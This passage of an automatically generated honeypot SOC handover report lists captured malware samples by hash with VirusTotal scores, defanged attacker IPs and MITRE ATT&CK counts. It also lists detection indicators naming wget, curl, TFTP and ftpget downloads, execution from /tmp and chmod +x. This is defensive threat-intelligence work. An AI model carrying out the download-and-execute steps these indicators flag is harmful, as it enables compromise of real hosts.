| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `123.123.196[.]140` | CN | China Unicom Beijing province network | **100** ⚠️ | 7 |
| `122.170.99[.]195` | IN | ABTS-MUMBAI | **100** ⚠️ | 50 |
| `202.72.196[.]75` | ID | PT Multidata Rancana Prima | **100** ⚠️ | 50 |
| `210.16.100[.]120` | US | Psychz Networks | **100** ⚠️ | 6 |
| `51.158.205[.]203` | NL | Scaleway - Amsterdam, Netherlands | **100** ⚠️ | 50 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `80.251.153[.]178` | NL | Amarutu Technology Ltd | **100** ⚠️ | 3 |
| `34.52.159[.]185` | BE | Google LLC | **100** ⚠️ | 0 |
| `91.92.42[.]7` | NL | TechTies Inc. | **100** ⚠️ | 28 |
| `211.247.127[.]250` | KR | SK Broadband Co Ltd | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 381 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 354 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 35 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 34 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 34 |

---

## 🔕 False Positive Summary (29 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 19 below threshold 25 | 2 |
| AbuseIPDB score 24 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 22 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 6728 cases |
| Tool 34  | Credential Extractor        | ✅ 371 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 18 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 83 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 29 filtered (0.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 66 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 354 priority case(s) shown individually · 38 recon entry/entries in table (15 group(s) consolidating 6322 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-15T08:34:05Z_
